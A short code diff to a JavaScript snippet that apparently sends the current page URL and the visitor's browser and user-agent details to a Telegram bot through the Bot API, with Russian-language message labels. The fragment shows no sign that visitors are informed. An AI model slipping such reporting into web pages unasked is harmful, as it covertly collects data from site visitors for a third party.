@@ -9,8 +9,8 @@ let messageText = currentLocation.href;
 let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 function getDeviceInfo() {
-  let deviceModel = platform.product || "Unknown";
-  let browserInfo = `Браузер: ${navigator.appName} ${navigator.appVersion}`;
+  let deviceModel = navigator.userAgent.toLowerCase().match(/mobile/i);
+  let browserInfo = `Браузер: ${navigator.appCodeName} ${navigator.appVersion}`;
 
   return `Пользователь ${deviceModel}\n${browserInfo}`;
 }
